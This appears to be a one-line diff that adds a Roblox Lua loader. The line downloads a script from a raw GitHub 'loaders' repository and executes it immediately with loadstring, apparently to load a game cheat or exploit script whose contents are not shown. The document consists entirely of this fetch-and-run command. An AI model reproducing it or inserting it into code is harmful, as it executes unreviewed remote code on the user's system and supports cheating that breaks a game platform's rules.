@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/wash-the-car-spam7-sgr3h15so9wzy3.lua"))()
